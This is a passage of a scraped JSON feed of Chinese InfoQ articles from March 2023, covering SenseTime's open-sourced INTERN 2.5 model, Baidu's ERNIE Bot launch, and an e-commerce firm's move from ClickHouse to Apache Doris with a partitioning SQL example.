    "summary": "<p>3月14日，商汤科技发布了多模态多任务通用大模型“<a href=\"https://github.com/OpenGVLab/InternImage\">书生（INTERN）2.5</a>\"”，并已经开源。</p><p>&nbsp;</p><p>据商汤介绍，该模型拥有30亿参数，是目前全球开源模型中<a href=\"https://github.com/jiweibo/ImageNet\">ImageNet</a>\"准确度最高、规模最大，同时也是物体检测标杆数据集COCO中唯一超过65.0 mAP的模型。</p><p>&nbsp;</p><p>“书生（INTERN）”最初版本由<a href=\"https://www.infoq.cn/article/mATFqe6zBIH3P4WrK6hN\">商汤科技</a>\"、上海人工智能实验室、清华大学、香港中文大学、上海交通大学在2021年11月首次共同发布，并持续联合研发。凭借在多模态多任务处理能力方面多项突破，“书生2.5”的图文跨模态开放任务处理能力可为<a href=\"https://www.infoq.cn/article/VEAmqNAPRjMud9ypeuNV\">自动驾驶</a>\"、机器人等通用场景任务提供高效精准的感知和理解能力支持，向通用人工智能又迈出了坚实一步。</p><p>&nbsp;</p><p>即日起，“书生2.5”多模态通用大模型已在商汤参与的通用视觉开源平台OpenGVLab开源。</p><p></p><h2>迈向AGI通用人工智能</h2><p></p><p></p><p>在当今快速增长的各式应用场景需求下，传统计算机视觉已无法处理真实世界中数不胜数的特定任务和场景需求。我们迫切需要一种具备通用场景感知和复杂问题处理能力的高级视觉系统。</p><p>&nbsp;</p><p>“书生2.5”实现了通过文本来定义任务，从而可以灵活地定义不同场景的任务需求，并根据给定视觉图像和任务的提示性语句，给出相应的指令或作答，进而具备通用场景下的高级感知和复杂问题处理能力，比如图像描述、视觉问答、视觉推理和文字识别等。</p><p>&nbsp;</p><p>在自动驾驶和居家机器人等通用场景下，“书生2.5”可辅助处理各种复杂任务。例如在自动驾驶场景下，可以大幅提升场景感知理解能力，准确地辅助车辆判断交通信号灯状态、道路标志牌等信息，为车辆的决策规划提供有效信息输入。</p><p>&nbsp;</p><p>“书生2.5”同时具备<a href=\"https://www.infoq.cn/video/kxtTSYgd34dmmI8Pzb1A\">AIGC</a>\"“以文生图”的能力，可根据用户提出的文本创作需求，利用扩散模型生成算法，生成高质量、自然的写实图像。例如借助“书生2.5”的以文生图能力帮助自动驾驶技术研发，通过生成各类真实的道路交通场景，如繁忙的城市街道、雨天拥挤的车道、马路上奔跑的狗等，生成写实的Corner Case训练数据，进而训练自动驾驶系统对Corner Case场景的感知能力上限。</p><p>&nbsp;</p><p>“书生2.5”还可根据文本快速检索出视觉内容。例如，可在相册中返回文本所指定的相关图像，或是在视频中，检索出与文本描述最相关的帧，提高视频中时间定位任务的效率。此外还支持引入物体检测框，根据文本返回最相关的物体，可实现开放世界视频或图像中物体检测及视觉定位。</p><p></p><h2>囊括三大模型能力，打通NLP、图像等多模态任务处理</h2><p></p><p></p><p>“书生2.5”在图文跨模态领域优秀的性能表现来自于视觉、语言及多任务建模三大模型能力的有效融合，即InternImage-G通用视觉大模型、用于文本理解的超大语言预训练模型（LLM）和用于多任务的兼容解码建模大模型（Uni-Perceiver）。</p><p>&nbsp;</p><p>其中，InternImage-G通用视觉大模型能够基于动态稀疏卷积算子自适应地调整卷积的位置和组合方式，从而为多功能视觉感知提供强大的表示。</p><p>&nbsp;</p><p><img src=\"https://static001.geekbang.org/infoq/1f/1f3afc4b1d6f59e0a3934f922a2bb5f2.jpeg\" /></p><p></p><p>超大语言模型通过在超大规模丰富文本语料库上进行预训练提供强大可靠的文本特征。Uni-Perceiver通才任务解码建模通过将不同模态的数据编码到统一的表示空间，将不同任务统一为相同的任务范式，从而能够以相同的架构和共享的模型参数同时处理各种模态和任务。此外，“书生2.5”还创新性地引入了任务级别的稀疏激活机制，使其具备高效的多任务协作能力。</p><p>&nbsp;</p><p>在视觉主流图像分类数据集ImageNet上，该模型仅基于公开数据便达到了90.1%的Top-1准确率。这是除谷歌与微软之外，唯一准确率超过90.0%的模型，值得一提的是，谷歌与微软均未公开模型及额外数据集。</p><p>&nbsp;</p><p>“书生2.5”项目地址：<a href=\"https://github.com/OpenGVLab/InternImage\">https://github.com/OpenGVLab/InternImage</a>\"</p>",
    "publish_time": "2023-03-16 16:23:30",
    "source": {
      "name": "infoq_recommend",
      "desc": "InfoQ推荐",
      "icon": "https://raw.githubusercontent.com/maguowei/today/master/imgs/icon/infoq.png"
    }
  },
  {
    "title": "刚刚，百度文心一言揭开面纱！能续写《三体》，算“鸡兔同笼”题，将开启首批内测",
    "url": "https://www.infoq.cn/article/Mz92EUBpvOwykbNG2iMz",
    "summary": "<p></p><p>千呼万唤始出来，百度文心一言拉开了下一个时代的大幕。</p><p></p><p>3 月 16 日下午，InfoQ 现场报道，百度宣布，基于百度新一代大语言模型的生成式 AI 产品 —文心一言宣布邀请测试。</p><p></p><h2>文心一言出世</h2><p></p><p></p><p>百度创始人、董事长兼首席执行官李彦宏以及百度首席技术官王海峰对文心一言进行了详细介绍，并展示了文心一言在文学创作、商业文案创作、数理推算、中文理解、多模态生成五个使用场景中的综合能力。</p><p></p><p><img src=\"https://static001.geekbang.org/infoq/4a/4aa6f564af5995cfadd08aa9b9d175b4.jpeg\" /></p><p></p><p></p><h2>新一代知识增强大语言模型，王海峰解读文心一言技术特性&nbsp;&nbsp;</h2><p></p><p></p><p>王海峰解读了文心一言的技术特性及其背后的技术积累。</p><p></p><p>王海峰表示，文心一言，是新一代知识增强大语言模型，它是在 ERNIE 及 PLATO 系列模型的基础上研发的。</p><p></p><p>文心一言的关键技术包括有监督精调、人类反馈的强化学习、提示、知识增强、检索增强和对话增强。</p><p>前三项是这类大语言模型都会采用的技术，ERNIE 和 PLATO 中也已经有应用和积累，在文心一言中又有了进一步强化和打磨；后三项则是百度已有技术优势的再创新，也是文心一言未来越来越强大的基础。</p><p>在知识增强方面，文心一言的知识增强主要是通过知识内化和知识外用两种方式。知识内化，是从大规模知识和无标注数据中，基于语义单元学习，利用知识构造训练数据，将知识学习到模型参数中；知识外用，是引入外部多源异构知识，做知识推理、提示构建等等。</p><p></p><p>在检索增强方面，文心一言的检索增强，来自以语义理解与语义匹配为核心技术的新一代搜索架构。通过引入搜索结果，可以为大模型提供时效性强、准确率高的参考信息，更好地满足用户需求。</p><p></p><p>在对话增强方面，基于对话技术和应用积累，文心一言具备记忆机制、上下文理解和对话规划能力，实现更好的对话连贯性、合理性和逻辑性。</p><p></p><p>据悉，文心一言大模型的训练数据包括万亿级网页数据、数十亿的搜索数据和图片数据、百亿级的语音日均调用数据，以及 5500 亿事实的知识图谱等。</p><p></p><p>百度构建了面向中文、服务应用、富含知识的多样化训练数据，对文心一言进行有监督精调，使其掌握的知识更精准，更懂中文和应用场景，并建立起人类反馈、奖励模型和策略优化之间的飞轮机制，随着真实用户的反馈越来越多，文心一言的效果会越来越好，能力越来越强。文心一言融合不同类型数据和知识，自动构造提示，包括实例、提纲、规范、知识点和思维链等，提供了丰富的参考信息，激发模型相关知识，生成高质量结果。</p><p></p><p>王海峰强调，飞桨深度学习平台支撑文心一言效果更好、效率更高、性能更强。对于开发训练，飞桨动静统一的开发范式，以及自适应分布式架构，可以实现大模型的灵活开发和高效训练。在推理部署方面，飞桨支持大模型高效推理，并提供服务化部署能力，包括计算融合、软硬协同的稀疏量化、模型压缩等等。</p><p></p><h2>五大使用场景、五大能力</h2><p></p><p></p><p>李彦宏现场展示了文心一言在五个使用场景的表现，包括文学创作、商业文案创作、数理推算、中文理解和多模态生成。</p><p></p><p>在文学创作场景中，文心一言根据对话问题将知名科幻小说《三体》的核心内容进行了总结，并提出了五个续写《三体》的建议角度，体现出对话问答、总结分析、内容创作生成的综合能力。</p><p></p><p>此外，文心一言准确回答了《三体》作者、电视剧角色扮演者等事实性问题。生成式 AI 在回答事实性问题时常常“胡编乱造”，而文心一言延续了百度知识增强的大模型理念，大幅度提升了事实性问题的准确率。</p><p></p><p><img src=\"https://static001.geekbang.org/infoq/e4/e4e1f2a3e4f619641a421e899cea1261.jpeg\" /></p><p></p><p>面对“于和伟和张鲁一有哪些共同点”、“于和伟和张鲁一谁更高”这类问题，文心一言也基于推理能力得出了正确答案。</p><p></p><p>在商业文案创作场景中，文心一言完成了给公司起名、写 Slogan、写新闻稿的创作任务。</p><p></p><p>连续三次内容创作生成中，文心一言既能准确理解人类意图，又能清晰地表达，这是基于庞大数据规模而发生的“智能涌现”。</p><p></p><p><img src=\"https://static001.geekbang.org/infoq/87/87a813c6e3b6ce75d3b38e153a262adc.jpeg\" /></p><p></p><p>文心一言还具备了一定的思维能力，能够学会数学推演及逻辑推理等相对复杂任务。面对“鸡兔同笼”这类锻炼人类逻辑思维的经典题，文心一言能理解题意，并有正确的解题思路，进而像学生做题一样，按正确的步骤，一步步算出正确答案。</p><p></p><p><img src=\"https://static001.geekbang.org/infoq/e7/e719c6042c1ee1d8ae6d914dc58888d7.jpeg\" /></p><p></p><p>文学创作、商业文案创作、数理推算是大语言模型常见的优势和能力，在此基础上，文心一言还表现出更优秀的中文理解及多模态生成能力。</p><p></p><p>作为扎根于中国市场的大语言模型，文心一言具备中文领域先进的自然语言处理能力，在中文语言和中国文化上有更好的表现。在现场展示中，文心一言正确解释了成语“洛阳纸贵”的含义、“洛阳纸贵”对应的经济学理论，还用“洛阳纸贵”四个字创作了一首藏头诗。</p><p></p><p><img src=\"https://static001.geekbang.org/infoq/53/5343a218cdb4f394b66d8837b9ed672a.jpeg\" /></p><p></p><p>在多模态生成方面，李彦宏现场展示了文心一言生成文本、图片、音频和视频的能力。有趣的是，文心一言甚至能够生成四川话等方言语音；文心一言的视频生成能力则因成本较高，现阶段还未对所有用户开放，未来会逐步接入。</p><p></p><p>“多模态是生成式 AI 一个明确的发展趋势。”李彦宏表示，“未来，随着百度多模态统一大模型的能力增强，文心一言的多模态生成能力也会不断提升。”</p><p></p><p><img src=\"https://static001.geekbang.org/infoq/d0/d09d17b54d20903612f37aef8ea978fd.jpeg\" /></p><p></p><p>从文心一言的表现看，某种程度上它具有了对人类意图的理解能力，回答的准确性、逻辑性、流畅性都逐渐接近人类水平。</p><p></p><p>但整体而言，这类大语言模型还远未到发展完善的阶段，有赖于通过真实的用户反馈而逐步迭代。</p><p></p><p>李彦宏强调，文心一言将建立起真实用户反馈、开发者调用和模型迭代之间的飞轮，效果会迅速提升，给用户“士别三日，当刮目相看”的惊喜。</p><p></p><p></p><h2>文心一言与 ChatGPT 相比可实现局部超越</h2><p></p><p></p><p>自去年 11 月发布以来，ChatGPT 在全球爆火，掀起了新一轮 AI 热潮。不过值得注意的是，ChatGPT 并不是革命性的技术，它更多是一场以产品思维驱动的重大集成创新的成果。</p><p></p><p>ChatGPT 是 OpenAI 对其 2020 年发布的 GPT-3.5 模型微调后开发出的对话机器人，严格来说，ChatGPT 并未实现底层模型的显著突破，它巧妙地采用了理解、生成和交互相结合的方式，基于人类反馈进行强化训练，在体验上带给人智能的感觉。</p><p></p><p>在使用的技术上，例如在训练阶段的数据飞轮，其底层技术是模型微调（SFT, Supervised fine-tuning）和从人类反馈中进行强化学习（RLHF，reinforcement learning from human feedback），以及在模型推理部署阶段的 Prompt，即提示学习，给预训练大语言模型一个提示，以使其更好理解人类问题。SFT、RLHF、prompt 都是业内有的方法，ChatGPT 和文心一言都应用了这些技术和方法，这意味着二者的底层是一样的。</p><p></p><p>百度的文心大模型和 Open AI 的 GPT 模型类似，在 2019 年就已经推出，并且已经迭代了多代，从单一的自然语言理解延申到多模态，包括视觉、文档、文图、语音等多模态多功能，因此“文心一言”所基于的 ERNIE 系列模型也已经具备较强泛化能力和性能。以最新发布的 ERNIE 3.0 Zeus 为例，该模型迭代于 ERNIE 3.0，拥有千亿级参数。其已经具备智能创作等各类自然语言理解和生成任务，且公开数据集上小样本学习、理解和生成任务效果皆好于业界其他模型。</p><p></p><p>在数据层面，ChatGPT 模型训练使用主要来自互联网的文本数据库，包括从网络文本、维基百科、文章中获得的 570GB 的数据。相比 ChatGPT，文心一言的优势在于，得益于百度搜索在真实数据和用户需求理解方面的积累，文心一言能够基于检索提升时效性准确性 。另外，文心大模型的定位是一个知识增强大模型，文心一言可以基于知识增强提升多轮推理对话。</p><p></p><p>多模态生成上，正如 Sam Altman 在推特上表示，GPT-4“仍然有缺陷，有局限性”。GPT-4 在多模态演示上有点突破，可以输入图片内容，但是输出的却还只能是文字。用户最期待的图片、视频生成仅仅停留在 PPT 讲稿上，还未开放，令人失望。而文心一言生成文本、图片、音频均可开箱即用。</p><p></p><p>此外，相比 ChatGPT，文心一言更侧重这样的技术如何在应用上更普惠。“ChatGPT 是 AI 技术发展到一定阶段后的新机会。怎么把这么酷的技术，变成人人需要的产品，让每天有几亿人从中受益？怎么赋能千行百业，让他们的生产效率大幅度地提升？这一步才是最难的，也是最伟大、最能够产生影响力的。”李彦宏曾如此评价 ChatGPT。</p><p></p><p></p><h2>首批用户即可通过邀请测试码，向企业开放 API 接口调用服务</h2><p></p><p></p><p>百度同时公布了文心一言的邀请测试方案。</p><p></p><p>3 月 16 日起，首批用户即可通过邀请测试码，在文心一言官网体验产品，后续将陆续开放给更多用户。</p><p>此外，百度智能云即将面向企业客户开放文心一言 API 接口调用服务。</p><p></p><p>3 月 16 日起正式开放预约，搜索“百度智能云”进入官网，可申请加入文心一言云服务测试。</p><p></p><p>据悉，自 2 月份百度官宣“文心一言”以来，已有超过 650 家企业宣布接入文心一言生态。现在，这些企业马上就能用上最新的大语言模型了。</p><p></p><p></p><h2>通过百度智能云提供服务，云和 AI 加速融合&nbsp;&nbsp;</h2><p></p><p></p><p>这几年，一个显著的趋势是云计算和 AI 正在加速融合。企业对于云计算的需求，更多体现于对智能化的需求。AI 大模型将成为云服务中不可或缺的一部分。</p><p></p><p>百度文心一言的定位是，人工智能基座型的赋能平台，将助力金融、能源、媒体、政务等千行百业的智能化变革。</p><p></p><p>百度宣布，文心一言将通过百度智能云对外提供服务，帮助企业构建自己的模型和应用，农业、工业、金融、教育、医疗、交通、能源等重点领域，都会因此效率大幅提升，并在每一个行业快速形成新的产业空间。</p><p></p><p>李彦宏预告，百度智能云将于近期举办新闻发布会，主题围绕文心一言的云服务和应用产品，既有公有云服务和也可以做私有化部署。</p><p></p><p></p><h2>增强百度搜索</h2><p></p><p></p><p>从信息检索的角度看，ChatGPT 取得了非常大的突破。业界一度有 ChatGPT 要颠覆谷歌搜索的论断出来。短期来看，ChatGPT 有望成为或者辅助像谷歌这种传统信息检索的强有力的工具。这几个月，谷歌、微软等也在加紧研发 ChatGPT 的竞品。</p><p></p><p>面对 ChatGPT，与对谷歌而言的“威胁者”态度不同。百度认为，ChatGPT 的出现，百度是受益者。</p><p>这一方面是基于自身更多元的收入结构作出的判断，以 2022 年 Q3 季度的营收数据为例，百度核心收入为 252 亿元，其中，广告收入 187 亿元；非广告收入 65 亿元。可以看到，百度智能云及其他 AI 驱动业务已逐渐与广告业务平分秋色。</p><p></p><p>另一方面，百度认为，生成式 AI 和搜索引擎是互补关系，而不是替代关系，搜索底层技术和 AI 底层技术是相通的。而且，生成式 AI 能够增强搜索。除开因 ChatGPT 带来的 DAU 及用户使用时长的攀升，同时搜索将能够充分利用类 ChatGPT 技术完善升级，形成搜索代际变革，生成式内容也会丰富内容生态和内容供给，让成熟的搜索业务和搜索体验焕发生机。去年，百度搜索宣布基于百度自研的生成式模型，升级“生成式搜索”能力。</p><p></p><p>此番文心一言问世后，其主要应用场景就是搜索。据悉，百度搜索会通过嵌入文心一言进行技术升级，提供更好的搜索和答案，全新的交互和聊天体现，以及独特的生成内容，吸引更多的用户。与此同时，它也能为平台上的广告商、内容创作者和商家赋能，通过 AIGC 提升短视频的内容供应能力。</p><p></p><p></p><h2>全球第一家大厂首发，大模型竞赛加剧</h2><p></p><p></p><p>自 ChatGPT 走红后，全球互联网大厂、创业公司纷纷加码布局。ChatGPT 引爆了一场军备竞赛，尤其是大型科技公司间的 AI 竞赛逐渐白热化。ChatGPT 爆火也让大模型卷了起来，国内已有多位 AI 大牛宣布杀入大模型领域创业，在国外，Meta、谷歌等巨头竞相推出自己最新的大模型...</p><p></p><p>过去这几个月，对于国产版 ChatGPT 呼声也是日益高涨。如今文心一言问世，这意味着百度成为全球大厂中第一个做出对标 ChatGPT 产品的企业。</p><p></p><p>李彦宏指出：“无论是哪家公司，都不可能靠突击几个月就能做出这样的大语言模型。深度学习、自然语言处理，需要多年的坚持和积累，没法速成。”</p><p></p><p>可以说，文心一言是百度过去多年努力的延续。一方面得益于百度在自然语言处理领域的领先性，NLP 是搜索业务的核心技术，百度的 NLP 能力也正伴随着搜索业务一路成长起来。</p><p></p><p>居高不下的技术门槛也让国内能做出类 ChatGPT 应用的公司少之又少。AI 的三要素包括算力、算法和数据，从这个角度看，全栈布局的公司更有优势。</p><p></p><p>李彦宏判断，人类进入人工智能时代，IT 技术的技术栈发生了根本性变化，从过去三层到“芯片 - 框架 - 模型 - 应用”四层。今天，百度是全球为数不多、在这四层进行全栈布局的人工智能公司，从高端芯片昆仑芯，到飞桨深度学习框架，再到文心预训练大模型，到搜索、智能云、自动驾驶、小度等应用，各个层面都有领先业界的自研技术。其中，文心一言处在模型层。而且，文心系列大模型已经普遍行业应用。</p><p></p><p>算力是目前制约大模型发展的一个瓶颈。有专家认为，未来大模型的竞争将逐渐演化为算力的竞争。有数据统计，跑通一次 100 亿以上参数量的模型，算力至少需要 1000 张 GPU 卡。前几天有新闻称，微软 Azure 云服务为 ChatGPT 布署了超过 1 万枚英伟达 A100 芯片。即使不使用顶级芯片，按照一张 GPU 五万元的市场均价计算，1000 张 GPU 意味着单月至少 5000 万的成本。业界测算，GPT-3 单次训练成本至少 460 万元。</p><p></p><p>大模型训练所需要的庞大又昂贵的算力让很多中小公司望而却步。而这也是百度这样的大厂的优势所在。据悉百度在算力上的布局，百度自研 AI 芯片“昆仑”已在多场景实际部署几万片，在搜索业务中也已形成较强工程化实践。</p><p></p><p>百度在有阳泉、徐水、定兴三个云计算中心。据悉，文心一言一部分是在阳泉智算中心计算。阳泉智算中心专门搭建了一个机房去支持文心一言的运行，目前正在封闭压力测试中，即将上线。</p><p></p><p>李彦宏认为，百度 AI 全栈布局的优势在于，可以在技术栈的四层架构中实现端到端优化，大幅提升效率。尤其是框架层和模型层之间，有很强的协同作用，可以帮助构建更高效的模型，并显著降低成本。事实上，超大规模模型的训练和推理，给深度学习框架带来了很大考验。比如，为了支持千亿参数模型的高效分布式训练，百度飞桨专门研发了 4D 混合并行技术。</p><p></p><p>“在全球范围内，在四层架构的每一层都有领先产品的公司几乎没有，这是百度非常独特的优势。后续，芯片、框架、大模型和终端应用场景可以形成高效的反馈闭环，帮助大模型不断调优迭代，从而升级用户体验”。李彦宏说。</p><p></p><p></p><h2>李彦宏：大语言模型将带来三大产业机会</h2><p></p><p></p><p>李彦宏认为，文心一言和生成式 AI 代表了一个新的技术范式，它会影响到每一家公司。AI 市场爆发性的需求增长，将释放出前所未有的、指数级的商业价值。</p><p></p><p>李彦宏预测，大语言模型将带来三大产业机会。</p><p></p><p>第一类是新型云计算公司，其主流商业模式从 IaaS 变为 MaaS。文心一言将根本性地改变云计算行业的游戏规则。之前企业选择云厂商更多看算力、存储等基础云服务。未来，更多会看框架好不好、模型好不好，以及模型、框架、芯片、应用这四层之间的协同。</p><p></p><p>第二类是进行行业模型精调的公司，这是通用大模型和企业之间的中间层，他们可以基于对行业的洞察，调用通用大模型能力，为行业客户提供解决方案。这方面，百度文心大模型已经在电力、金融、媒体等领域，发布了 10 多个行业大模型。</p><p></p><p>第三类是基于大模型底座进行应用开发的公司，即应用服务提供商。李彦宏断言，对于大部分创业者和企业来说，真正的机会并不是从头开始做 ChatGPT 和文心一言这样的基础大模型，这很不现实，也不经济。基于通用大语言模型抢先开发重要的应用服务，这可能才是真正的机会。目前，基于文本生成、图像生成、音频生成、视频生成、数字人、3D 等场景，已经涌现出很多创业明星公司，可能就是未来的新巨头。</p><p></p><p>“我们相信，人工智能会彻底改变我们今天的每一个行业。AI 的长期价值，对各行各业的颠覆性改变，才刚刚开始。未来，将会有更多的杀手级应用、现象级产品出现，将会有更多的里程碑事件发生。”李彦宏说道。</p><p></p><p></p><h2>大模型爆发驱动 AIGC 更加普惠</h2><p></p><p></p><p>自去年以来， AIGC 发展浪潮凶猛。尤其是去年下半年，AIGC 概念突然升温。有这么几个标志性的事件把 AIGC 推到了风口浪尖之上，其一是文生图模型 Stable Diffusion 的开源，其二是 ChatGPT 的爆火出圈。</p><p></p><p>此次，文心一言问世对于国内 AIGC 领域来说将成为一个标志性事件，对于百度来说亦是如此。作为在国内 AIGC 领域布局的代表者，百度拥有 AI 作画、数字人等多项 AIGC 业务。</p><p></p><p>去年以来，李彦宏也曾频频在公开场合大谈 AIGC 的发展，他认为，AI 领域在去年的一个重大的突破就是 AIGC。他也预判，“未来十年，AIGC 将颠覆现有内容生产模式，可以实现以‘十分之一的成本’，以百倍千倍的生产速度，去生成 AI 原创内容。</p><p></p><p>现阶段，AIGC 的生成效果已经非常惊艳了，它已经达到了广泛应用的基础性能，虽然在使用上还有较大门槛。相信随着文心等大模型技术的不断发展，有助于将 AIGC 门槛降下来，真正的降本到每个普通人都可以实际用上 AIGC，事实上，这一天可能已经很近很近了。</p><p></p><p>为了让大家切身体验到AIGC的魔力，极客时间推出了系列AIGC公开课，涵盖 Chat GPT、Chatbot、Copilot、AI 绘画，帮助你从0-1入门AIGC，下图扫码【限时免费】领，极客时间网页版用户还可通过“AI学习助手”亲测～</p><p></p><p><img src=\"https://static001.geekbang.org/infoq/fc/fce1f2f8e3f63c4014a78366f2446f30.png\" /></p><p></p>",
    "publish_time": "2023-03-16 17:09:52",
    "source": {
      "name": "infoq_recommend",
      "desc": "InfoQ推荐",
      "icon": "https://raw.githubusercontent.com/maguowei/today/master/imgs/icon/infoq.png"
    }
  },
  {
    "title": "从 Clickhouse 到 Apache Doris，慧策电商 SaaS 高并发数据服务的改造实践",
    "url": "https://www.infoq.cn/article/FyrFhZJ2mGpJptmQLVGu",
    "summary": "<p>慧策（原旺店通）是一家技术驱动型智能零售服务商，基于云计算 PaaS、SaaS 模式，以一体化智能零售解决方案，帮助零售企业<a href=\"https://www.infoq.cn/article/Oa21rCaXB29CkB2oBvO5\">数字化智能化升级</a>\"，实现企业规模化发展。凭借技术、产品、服务优势，慧策现已成为行业影响力品牌并被零售企业广泛认可。2021年7月，慧策完成最新一轮 D 轮 3.12 亿美元的融资，累计完成四轮逾 4.52 亿美元的融资，与诸多国际一流企业、行业头部企业并列而行，被全球顶尖投资公司看好。</p><p></p><h1>业务需求</h1><p></p><p>慧经营是一款<a href=\"https://www.infoq.cn/article/8SU754VFuKpw8gwjF24v\">数据分析</a>\"产品，主要提供经营分析、运营分析、应收对账三大功能，面向企业的经营、运营、财务三个角色。如图所示，慧经营上游为常见的电商平台、直播平台以及慧策主要的产品旺店通，这些平台在交易过程中会产生大量的数据，包括收入、成本以及多种费用相关的数据。这些数据都比较分散，如果客户手动进行数据汇总和分析，过程繁琐、难度较高且展示不够直观。而慧经营可以在客户授权下获取、汇总这些数据，根据客户需求提供经营分析、报表生成、账单汇总等多项数据分析服务，以帮助客户更好地经营店铺。</p><p></p><p><img src=\"https://static001.geekbang.org/infoq/77/772efa8c0fa89d5eee24aa8ed924891b.png\" /></p><p></p><p>为了能承载上述数据相关的服务，我们在系统架构设计之初需要考虑以下几点：</p><p></p><p>低成本：慧经营的付费模式为按需付费，这要求架构必须具有轻量化、易维护的特性。基于这点考虑，首先排除基于 Hadoop 的生态架构，虽然 Hadoop 足够成熟，但是组件依赖度较高、繁琐复杂，无论是运维成本还是使用成本都非常高。高性能：电商数据为慧经营的主要数据来源，数据维度丰富， ETL 复杂度高；另外，在很多使用场景中明细查询与聚合查询是并存的，既需要够快速定位数据范围，又需要高效的计算能力，因此需要一个强大的 OLAP 引擎来支撑。合理资源分配：客户规模差异较大，有月单量只有 1 万的小客户，也有月单量高达千万级别的大客户，资源合理分配在这样的场景下异常重要，因此要求 OLAP 引擎可以在不影响用户体验的前提下，可以根据客户的需求进行资源分配，避免大小查询资源抢占带来的性能问题。高并发：能够承受上游平台多来源、高并发的大量数据的复杂 ETL，尤其在 618、双 11 这样的业务高峰期，需要具备高效查询能力的同时，能够承担大量的写入负载。</p><p></p><h1>架构演进</h1><p></p><p></p><h2>架构 1.0</h2><p></p><p><img src=\"https://static001.geekbang.org/infoq/f9/f98fa373217897306bc6e6ee80672693.png\" /></p><p></p><p>基于以上考虑，我们在架构 1.0 中引入 <a href=\"https://www.infoq.cn/article/vGabIOdeUM87hv6X8qlL\">Clickhouse</a>\" 作为 OLAP 引擎。从上图可看出该架构是一个完全基于后端 Java 以及 Spring 的技术架构，通过 Binlog 同步的方式通过 Canal 和 Kafka 将数据从 <a href=\"https://www.infoq.cn/article/dassaX2O2WqvGjqpbXlf\">MySQL</a>\" 同步至Clickhouse，来承接前端的各种经营分析报表服务。</p><p></p><p>架构 1.0 在上线不久后就遭遇了慢查询问题。在早期客户和数据量较少时，查询性能尚可满足客户需求，但是随着数据量的不断增大，受限于<a href=\"https://www.infoq.cn/article/3xtSDtHUgTKRsyw3kZXH\"> MySQL </a>\"本身的特性， ETL 效率逐渐低到无法令人接受，尤其在面对大客户场景时，即使命中索引、扫描数据范围仅在百万级别，MySQL 应对该场景也已十分吃力。其次，面对激增的数据，ClikHouse 的多表 Join 也遭遇性能问题，由于其几乎不支持分布式 Join，尽管提供了 Join 语义、但在使用上对多表 Join 的支撑较弱、复杂的关联查询常常会引起 OOM。</p><p></p><p>在 ClickHouse 单机性能不能支撑业务时，我们考虑扩展搭建集群以提高性能，而 ClickHouse 分布式场景需要依赖 Zookeeper，同时需要单独维护一套分布式表，这将使运维管理的难度和成本不断升高。</p><p></p><p>除此之外，ClickHouse 还有几个较大的问题，背离了我们最初对架构的选型要求：</p><p></p><p>不支持高并发，即使一个查询也会用服务器一半的 CPU。对于三副本的集群，通常会将 QPS 控制在 100 以下。ClickHouse 的扩容缩容复杂且繁琐，目前做不到自动在线操作，需要自研工具支持。ClickHouse 的 ReplacingMergeTree 模型必须添加final 关键字才能保证严格的唯一性，而设置为final后性能会急剧下降。</p><p></p><h2>架构 2.0</h2><p></p><p>我们在架构 2.0 中引入 <a href=\"https://github.com/apache/doris\">Apache Doris</a>\" 作为 OLAP 引擎，并进行了一次整体的架构升级。选择 Apache Doris 的主要原因有如下几条：</p><p></p><p>使用成本低： 只有 FE 和 BE 两类进程，部署简单，支持弹性扩缩容，不依赖其他组件，运维成本非常低；同时兼容 MySQL协议 和标准 SQL，开发人员学习难度小，项目整体迁移使用成本也比较低。Join 性能优异： 项目存在很多历史慢 SQL ，均为多张大表 Join，Apache Doris 良好的 Join 性能给我们提供了一段优化改造的缓冲期。社区活跃度高： 社区技术氛围浓厚，且 SelectDB 针对社区有专职的技术支持团队，在使用过程中遇到问题均能快速得到响应解决。</p><p></p><p><img src=\"https://static001.geekbang.org/infoq/19/19919a2020dfb0719f66d2763252036e.png\" /></p><p></p><p>如上图所示，我们将原本基于 MySQL 的基础数据存储迁移到 Doris 中，同时将大部分的 ETL 迁移至在 Doris 内部进行，MySQL 只用于存储配置信息。同时引入了 Flink，DolphinScheduler 等组件，成功构建了一套以 Doris 为核心、架构简洁、运维简单的数据生产体系。</p><p></p><p>全新的架构也给我们带来的显著的收益：</p><p></p><p>ETL 效率极大提升：慧经营的数据维度丰富、 ETL 复杂度高，得益于 Apache Doris 强大的运算能力及丰富的数据模型，将 ETL 过程放在 Doris 内部进行后效率得到显著提升；Join 耗时大幅降低：查询性能同样得到极大提升，在 SQL 未经过改造的情况下，多表 Join 查询耗时相较于过去有了大幅降低。并发表现出色：在业务查询高峰期可达数千 QPS，而 Apache Doris 面对高并发查询时始终表现平稳；存储空间节省：Apache Doris 的列式存储引擎实现了最高 1:10 的数据压缩率，使得存储成本得到有效降低。运维便捷：Apache Doris 架构简单、运维成本低，扩容升级也非常方便，我们前后对 Doris 进行了 3 次升级扩容，基本都在很短的时间内完成。</p><p></p><p>在使用 Apache Doris 的过程中，我们对 Doris 如何更好地应用也进行了探索，在此期间总结出许多实践经验，通过本文分享给大家。</p><p></p><h1>实践应用</h1><p></p><p></p><h2>分区分桶优化</h2><p></p><p>在执行 SQL 时，SQL 的资源占用和分区分桶的大小有着密切的关系，合理的分区分桶将有效提升资源的利用率，同时避免因资源抢占带来的性能下降。</p><p></p><p>因此我们在建立事实表分区时，会根据客户的数据规模提供相匹配的分区方案，比如数据规模较小按年分区、规模大按月分区。在这种分区方式下，可以有效避免小查询占用过多资源问题，而大客户的使用体验也由于细粒度的分区方式得到了提升。</p><p></p><p><code lang=\"text\">CREATE TABLE DWD_ORDER_... (    \n...)    \n...\nPARTITION BY RANGE(tenant,business_date)\n(\nPARTITION p1_2022_01_01 VALUES [(\"1\", '2022- 01- 01'), (\"1\", '2023- 01- 01')),\nPARTITION p2_2022_01_01 VALUES [(\"2\", '2022- 01- 01'), (\"2\", '2022- 07- 01')),\nPARTITION p3_2022_01_01 VALUES [(\"3\", '2022- 01- 01'), (\"3\", '2022- 04- 01')),\nPARTITION p4_2022_01_01 VALUES [(\"4\", '2022- 01- 01'), (\"4\", '2022- 02- 01')),    \n...\n)\n</code></p><p></p><p>而分桶的设置上我们采用了最新版本中增加的自动分桶推算功能，使用方式非常便捷，不用再去测算和预估每张表的数据量以及对应 Tablet 的增长关系，系统自动帮助我们推算出合理分桶数，提升性能的同时也使得系统资源得到更好利用。</p><p></p><p>参考文章：<a 